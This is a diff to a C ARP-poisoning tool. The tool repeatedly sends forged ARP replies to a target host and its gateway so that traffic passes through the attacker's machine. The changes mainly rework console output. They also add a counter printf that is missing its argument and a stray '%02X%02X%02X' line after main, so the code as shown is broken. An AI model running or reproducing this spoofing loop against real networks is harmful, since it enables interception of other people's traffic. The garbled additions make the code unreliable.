@@ -30,7 +30,7 @@ int sockfd;
 
 void cleanup() {
 	close(sockfd);
-	printf("\033[?25h");
+	printf("\033[?25h\n");
 	exit(0);
 }
 
@@ -283,11 +283,13 @@ int main(int argc, char ** argv) {
 	printf("Starting poisoning...\n\033[?25l");
 	int sent = 1;
 
+	printf("ARP - %s is at -> %02X:%02X:%02X:%02X:%02X:%02X [%s]\n", target_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], gateway_ip);
+	printf("ARP - %s is at -> %02X:%02X:%02X:%02X:%02X:%02X [%s]\n", gateway_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], target_ip);
+	
 	while(1) {
 		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
-		printf("ARP - %s is at -> %x:%x:%x:%x:%x:%x [%s]\n", gateway_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], target_ip);
 		sendto(sockfd, arp_poison_gateway_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
-		printf("ARP - %s is at -> %x:%x:%x:%x:%x:%x [%s]\n", target_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], gateway_ip);
+		printf("\r[%0.5d] Sent packet");
 		fflush(stdout);
 		sleep(3);
 	}
@@ -295,3 +297,4 @@ int main(int argc, char ** argv) {
 	return 0;
 }
 
+%02X%02X%02X
